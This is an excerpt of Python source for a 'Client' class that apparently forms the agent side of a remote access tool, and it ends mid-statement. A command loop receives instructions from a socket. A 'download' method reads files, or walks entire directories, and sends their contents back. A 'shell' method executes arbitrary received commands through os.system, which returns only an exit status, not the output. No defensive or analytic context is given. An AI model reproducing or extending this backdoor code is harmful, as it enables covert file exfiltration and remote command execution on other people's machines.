...
class Client:
    ...
    def create_package_response(self,header,**kwargs):
        self.sock_handler.send(header,**kwargs)
    def download(self,path):
        if not os.path.exists(path):
            self.sock_handler.send(header="file_credentials",file_path="invalid_path",file_data="")
        else:
            if os.path.isfile(path):
                with IOUtils(path,mode=Modes.MODE_READ_AS_BINARY) as io_handler:
                    data = io_handler.read()
                    self.sock_handler.send("file_credentials",file_path=path,file_data=data)
                ...
                for root,_,files in os.walk(path):
                    for f in files:
                        ...
                        with IOUtils(full_path,mode=Modes.MODE_READ_AS_BINARY) as io_handler:
                            data = io_handler.read()
                            self.sock_handler.send("file_credentials",file_path=full_path,file_data=data)
                self.sock_handler.send("file_credentials",file_path="EOP",file_data="")
            else:
                self.sock_handler.send("file_credentials",file_path="invalid_file_type",file_data="")
    def shell(self,commands):
        try:
            executed_command_output = str(os.system(commands))
            self.sock_handler.send("shell_exec",command_output=executed_command_output)
        except Exception as exec_err:
            self.sock_handler.send(header=ErrorMessages.ERR_MSG_I_CANT_DO_SHELL_EXEC,exception=str(exec_err))
    ...
    def handle_commands(self):
        ...
        while True:
            ...
            pkt_header = raw_data.header
            data = raw_data.data
            print(pkt_header,data)
            if pkt_header:
